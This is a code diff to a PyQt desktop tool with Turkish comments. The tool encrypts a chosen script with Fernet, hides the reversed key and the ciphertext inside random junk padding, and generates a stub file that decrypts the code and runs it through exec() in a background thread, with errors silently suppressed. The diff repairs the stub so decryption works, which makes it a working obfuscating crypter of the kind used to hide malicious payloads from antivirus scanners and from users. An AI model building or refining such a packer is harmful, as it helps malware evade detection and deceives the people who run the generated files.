@@ -56,50 +56,47 @@ class Ui_MainWindow(object):
             fer = Fernet(key_bytes)
             sifreli_veri = fer.encrypt(icerik)
 
-           
             toplam = string.ascii_letters + string.digits + string.punctuation
             ekleneceksey = "".join(random.choices(toplam, k=10000))
             ekleneceksey2 = "".join(random.choices(toplam, k=10000))
-            ekleneceksey3 = "".join(random.choices(toplam, k=10000))
-            ekleneceksey11 = "".join(random.choices(toplam, k=1000))
-            ekleneceksey12 = "".join(random.choices(toplam, k=1000))
             
-        
+            # Junk veriler (çöp veriler)
+            cop1 = "".join(random.choices(toplam, k=1000)).encode()
+            cop2 = "".join(random.choices(toplam, k=1000)).encode()
+            
+            # Anahtarı gizleme
             key_str = key_bytes.decode()
             fake_prefix = "".join(random.choices(toplam, k=1000))
             fake_suffix = "".join(random.choices(toplam, k=1000))
-            final_key_data = fake_prefix + key_str + fake_suffix
-            final_key_data = final_key_data[::-1]
+            final_key_data = (fake_prefix + key_str + fake_suffix)[::-1]
 
-            prefix = sifreli_veri[:8]
+            # Şifreli veriyi parçala (Fernet imzası ilk 8 bayttır)
+            prefix_data = sifreli_veri[:8]
             payload_body = sifreli_veri[8:]
-            sifreli_veri_obfuscated = ekleneceksey11.encode() + payload_body + ekleneceksey12.encode()
+            # Gövdeyi çöple sarmala
+            sifreli_veri_obfuscated = cop1 + payload_body + cop2
 
             yeni_dosya_icerigi = f'''
 import os
 import time
 import threading
-
 from cryptography.fernet import Fernet
-_a_={ekleneceksey!r}
-_k_val = {final_key_data!r}
-_b_={ekleneceksey2!r}
-_k_val = _k_val[::-1]
-_k_val = _k_val[1000:-1000]
 
-_p_prefix = {ekleneceksey3!r}
-_p_body = {sifreli_veri_obfuscated!r}
-_p_body = _p_body[1000:-1000]
+_a_ = {ekleneceksey!r}
+_k_val = {final_key_data!r}[::-1][1000:-1000]
+_b_ = {ekleneceksey2!r}
+
+_p_pre = {prefix_data!r}  # BURASI DÜZELTİLDİ: Gerçek Fernet imzası
+_p_body = {sifreli_veri_obfuscated!r}[1000:-1000] # Çöplerden arındırılıyor
 
 def baslat():
     try:
         f = Fernet(_k_val)
-        # Reconstruct the original Fernet token
-        kod = f.decrypt(_p_prefix + _p_body)
+        # Orijinal Fernet token yapısını geri kur: imza + gövde
+        kod = f.decrypt(_p_pre + _p_body)
         exec(kod, globals())
-    except Exception:
+    except Exception as e:
         pass
-
 
 if __name__ == "__main__":
     t = threading.Thread(target=baslat)
@@ -111,18 +108,13 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         pass
 '''
-            os.chdir(dosya_yolu_dir)
-            with open(dosya_adi, "w", encoding="utf-8") as f:
+            with open(os.path.join(dosya_yolu_dir, dosya_adi), "w", encoding="utf-8") as f:
                 f.write(yeni_dosya_icerigi)
             
-            print(f"Başarıyla oluşturuldu: {os.path.join(dosya_yolu_dir, dosya_adi)}")
-            QMessageBox.information(None, "Başarılı", f"Dosya başarıyla oluşturuldu:\n{dosya_adi}")
+            QMessageBox.information(None, "Başarılı", f"Dosya oluşturuldu: {dosya_adi}")
             
         except Exception as e:
-            print(f"Hata oluştu: {str(e)}")
-            QMessageBox.critical(None, "Hata", f"Bir hata oluştu:\n{str(e)}")
-
-
+            QMessageBox.critical(None, "Hata", f"Hata: {str(e)}")
 
     def dosya_sec(self):
 
